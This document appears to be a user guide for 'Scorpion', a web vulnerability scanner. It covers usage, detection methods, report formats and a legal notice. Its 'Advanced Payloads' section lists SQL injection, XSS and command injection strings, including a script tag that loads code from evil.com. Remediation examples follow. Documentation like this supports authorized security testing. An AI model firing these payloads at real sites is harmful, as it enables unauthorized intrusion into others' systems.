# Scorpion Web Vulnerability Scanning Guide

## Overview

Scorpion's `webscan` command provides **production-grade web application security scanning** with advanced vulnerability detection capabilities. This tool rivals industry-leading web scanners like **Burp Suite**, **OWASP ZAP**, and **Acunetix**.

## Features

### üéØ Vulnerability Detection

1. **SQL Injection (SQLi)**
   - Error-based detection (MySQL, PostgreSQL, SQL Server, Oracle)
   - Time-based blind SQLi (SLEEP, WAITFOR, PG_SLEEP)
   - Boolean-based blind SQLi
   - UNION-based injection

2. **Cross-Site Scripting (XSS)**
   - Reflected XSS detection
   - Multiple payload types (script tags, event handlers, SVG, etc.)
   - Context-aware detection
   - Confidence levels based on payload reflection

3. **Command Injection**
   - Time-based detection (sleep, ping commands)
   - Output-based detection (whoami, uid, etc.)
   - Multiple OS command syntax (; | & ` $())

4. **Server-Side Request Forgery (SSRF)**
   - AWS metadata endpoint detection (169.254.169.254)
   - GCP metadata endpoint detection
   - Internal network access (localhost, 127.0.0.1, [::1])
   - File protocol support detection (file://)

5. **Security Headers Analysis**
   - Strict-Transport-Security (HSTS)
   - Content-Security-Policy (CSP)
   - X-Frame-Options (Clickjacking protection)
   - X-Content-Type-Options
   - X-XSS-Protection

6. **CORS Misconfiguration**
   - Wildcard with credentials detection
   - Origin reflection without validation
   - Untrusted origin acceptance

7. **Information Disclosure**
   - Server version disclosure
   - Technology stack disclosure (X-Powered-By, etc.)

## Usage

### Basic Scan

```bash
# Full vulnerability scan
scorpion webscan https://example.com/page?id=1

# Scan with custom parameters
scorpion webscan https://example.com/api/user?id=100&page=admin
```

### Advanced Options

```bash
# Customize concurrency and timeout
scorpion webscan https://example.com -c 20 -t 30

# Disable SSL verification (for testing environments)
scorpion webscan https://localhost:8443 --no-ssl-verify

# Filter by severity
scorpion webscan https://example.com -s critical,high

# Save results to JSON
scorpion webscan https://example.com -o report.json
```

### Selective Testing

```bash
# Only scan for SQL injection and XSS
scorpion webscan https://example.com --no-cmdi --no-ssrf --no-headers --no-cors

# Only security headers and CORS
scorpion webscan https://example.com --no-sqli --no-xss --no-cmdi --no-ssrf

# Skip specific scans
scorpion webscan https://example.com --no-ssrf --no-cmdi
```

## Real-World Examples

### Example 1: Testing Login Page

```bash
scorpion webscan "https://target.com/login?user=admin&pass=test" -c 10
```

**Expected Findings:**
- SQL injection in user/pass parameters
- XSS in error messages
- Missing security headers
- CORS misconfiguration

### Example 2: API Endpoint Testing

```bash
scorpion webscan "https://api.target.com/v1/user?id=123&action=view" -c 15 -t 20
```

**Expected Findings:**
- SQL injection in id parameter
- SSRF via action parameter
- JSON-based XSS
- CORS issues with API

### Example 3: File Upload Testing

```bash
scorpion webscan "https://target.com/upload?file=test.jpg&path=/uploads/" -c 5
```

**Expected Findings:**
- Command injection in path parameter
- File protocol SSRF
- Directory traversal indicators

### Example 4: Admin Panel Testing

```bash
scorpion webscan "https://target.com/admin/panel?module=users&filter=active" -s critical,high
```

**Expected Findings:**
- SQL injection in filter parameter
- Command injection in module parameter
- Sensitive data exposure

## Detection Methods

### SQL Injection Detection

1. **Error-Based**: Looks for database error messages in responses
   - MySQL: `mysql_fetch`, `sql syntax`
   - PostgreSQL: `pg_query`, `syntax error`
   - SQL Server: `microsoft sql server`, `unclosed quotation mark`
   - Oracle: `ora-`, `quoted string not properly terminated`

2. **Time-Based Blind**: Measures response time delays
   - `SLEEP(5)` - MySQL
   - `WAITFOR DELAY '00:00:05'` - SQL Server
   - `PG_SLEEP(5)` - PostgreSQL

3. **Boolean-Based Blind**: Analyzes content length changes
   - `' OR '1'='1'` vs normal response
   - Content difference analysis

### XSS Detection

- **Reflection Check**: Verifies if payload appears in response unencoded
- **Context Analysis**: Determines if payload is in executable context
- **Confidence Levels**:
  - **Confirmed**: `<script>` tags or `onerror=` reflected
  - **Likely**: Other HTML tags with event handlers reflected

### Command Injection Detection

1. **Time-Based**: Response time > baseline + 4.5 seconds
   - `; sleep 5`
   - `| sleep 5`
   - `& ping -c 5 127.0.0.1`

2. **Output-Based**: Command output in response
   - `whoami` output (root, administrator, uid=)
   - `id` output (gid=, groups=)

### SSRF Detection

1. **AWS Metadata**: `ami-id`, `instance-id`, `security-credentials`
2. **File Access**: `root:`, `administrator:`, `[extensions]`
3. **Internal Access**: Response from localhost/127.0.0.1 with content

## Severity Levels

| Severity | Description | Examples |
|----------|-------------|----------|
| **CRITICAL** | Direct exploitation possible | SQLi with error messages, Command injection with output |
| **HIGH** | Likely exploitable with effort | Time-based blind SQLi, Confirmed XSS, SSRF to AWS metadata |
| **MEDIUM** | Requires specific conditions | Possible XSS, CORS misconfiguration, Missing CSP |
| **LOW** | Security weakness | Missing X-Content-Type-Options, Missing X-Frame-Options |
| **INFO** | Information disclosure | Server version disclosure, Technology stack exposure |

## Output Format

### Console Output

```
Found 11 vulnerabilities:

‚óè CRITICAL: 2
‚óè HIGH: 4
‚óè MEDIUM: 5

‚ï≠‚îÄ‚îÄ‚îÄ Finding #1 ‚îÄ‚îÄ‚îÄ‚ïÆ
‚îÇ Type: SQL Injection
‚îÇ Severity: CRITICAL
‚îÇ Confidence: confirmed
‚îÇ URL: https://example.com/page?id=1
‚îÇ Parameter: id
‚îÇ Method: GET
‚îÇ Payload: ' OR '1'='1
‚îÇ
‚îÇ Evidence:
‚îÇ SQL error detected: mysql_fetch
‚îÇ
‚îÇ Description:
‚îÇ Parameter 'id' appears vulnerable to SQL injection...
‚îÇ
‚îÇ Remediation:
‚îÇ Use parameterized queries/prepared statements...
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ
```

### JSON Output

```json
{
  "target": "https://example.com/page?id=1",
  "scan_time": "2025-12-10T15:30:00",
  "total_findings": 11,
  "by_severity": {
    "critical": 2,
    "high": 4,
    "medium": 5,
    "low": 0,
    "info": 0
  },
  "findings": [
    {
      "vuln_type": "SQL Injection",
      "severity": "critical",
      "url": "https://example.com/page?id=1",
      "parameter": "id",
      "method": "GET",
      "payload": "' OR '1'='1",
      "evidence": "SQL error detected: mysql_fetch",
      "description": "Parameter 'id' appears vulnerable to SQL injection...",
      "remediation": "Use parameterized queries/prepared statements...",
      "confidence": "confirmed"
    }
  ]
}
```

## Best Practices

### Before Testing

1. **Get Authorization**: Always obtain written permission before testing
2. **Understand Scope**: Know which URLs/parameters are in scope
3. **Backup Data**: Ensure target has recent backups
4. **Coordinate**: Inform the security team of testing schedule

### During Testing

1. **Start Conservative**: Use low concurrency initially
2. **Monitor Impact**: Watch for performance degradation
3. **Document Findings**: Save results with `-o report.json`
4. **Test Incrementally**: Start with safe tests (headers, CORS) before SQLi/CMDi

### After Testing

1. **Report Immediately**: Share critical findings ASAP
2. **Provide Evidence**: Include payloads, responses, and remediation
3. **Retest Fixes**: Verify remediation effectiveness
4. **Clean Up**: Remove any test data/accounts created

## Integration with Other Scorpion Tools

### Complete Web Application Assessment

```bash
# 1. Reconnaissance
scorpion recon example.com -o recon.json

# 2. Port scanning
scorpion scan -t example.com --web -sV -T aggressive

# 3. Technology detection
scorpion tech https://example.com

# 4. Directory busting
scorpion dirbust https://example.com -w wordlist.txt

# 5. Web vulnerability scanning
scorpion webscan https://example.com/page?id=1 -o vulns.json

# 6. SSL/TLS analysis
scorpion ssl example.com

# 7. API testing
scorpion api https://api.example.com

# 8. Nuclei vulnerability scan
scorpion nuclei example.com --tags cve,owasp --severity high,critical
```

## Comparison with Other Tools

| Feature | Scorpion | Burp Suite | OWASP ZAP | SQLmap | Nuclei |
|---------|----------|------------|-----------|--------|--------|
| SQL Injection | ‚úÖ | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå |
| XSS Detection | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå | ‚úÖ |
| Command Injection | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå | ‚ùå |
| SSRF Detection | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå | ‚úÖ |
| Security Headers | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå | ‚úÖ |
| CORS Testing | ‚úÖ | ‚úÖ | ‚úÖ | ‚ùå | ‚ùå |
| Speed | Fast | Slow | Medium | Medium | Fast |
| Setup | Easy | Complex | Medium | Easy | Easy |
| Cost | Free | Paid | Free | Free | Free |

## Troubleshooting

### Issue: False Positives

**Solution**: Use severity filtering and review evidence carefully

```bash
scorpion webscan https://example.com -s critical,high
```

### Issue: Slow Scans

**Solution**: Reduce concurrency or timeout

```bash
scorpion webscan https://example.com -c 5 -t 10
```

### Issue: SSL Certificate Errors

**Solution**: Disable SSL verification for testing environments

```bash
scorpion webscan https://localhost --no-ssl-verify
```

### Issue: No Parameters Detected

**Solution**: Manually specify URL with parameters

```bash
# Instead of: https://example.com/page
# Use: https://example.com/page?id=1&action=view
```

## Legal Notice

‚ö†Ô∏è **WARNING**: Web application penetration testing without authorization is **ILLEGAL**.

- Only test applications you own or have **explicit written permission** to test
- Unauthorized testing may violate:
  - Computer Fraud and Abuse Act (CFAA) in the USA
  - Computer Misuse Act in the UK
  - Similar laws in other countries
- Penalties may include **fines and imprisonment**

**Use this tool responsibly and ethically.**

## Advanced Payloads

### SQL Injection Payloads

```sql
-- Error-based
'
"
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' /*

-- Time-based
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
1'; SELECT PG_SLEEP(5)--

-- UNION-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### XSS Payloads

```html
<!-- Script-based -->
<script>alert(1)</script>
<script src=//evil.com></script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Advanced -->
<iframe src=javascript:alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### Command Injection Payloads

```bash
# Unix/Linux
; whoami
| whoami
& whoami
`whoami`
$(whoami)
; sleep 5
| sleep 5

# Windows
& whoami
| whoami
& timeout /t 5
```

## Remediation Guide

### SQL Injection

```python
# BAD
query = f"SELECT * FROM users WHERE id = {user_input}"

# GOOD
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))
```

### XSS

```python
# BAD
return f"<div>Welcome {user_input}</div>"

# GOOD
import html
return f"<div>Welcome {html.escape(user_input)}</div>"
```

### Command Injection

```python
# BAD
os.system(f"ping {user_input}")

# GOOD
import subprocess
subprocess.run(["ping", "-c", "1", user_input], check=True)
```

### SSRF

```python
# BAD
response = requests.get(user_provided_url)

# GOOD
allowed_hosts = ["api.trusted.com", "cdn.trusted.com"]
parsed = urlparse(user_provided_url)
if parsed.netloc in allowed_hosts:
    response = requests.get(user_provided_url)
```

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

**Scorpion Web Vulnerability Scanning** - Production-grade web application security scanning made simple.
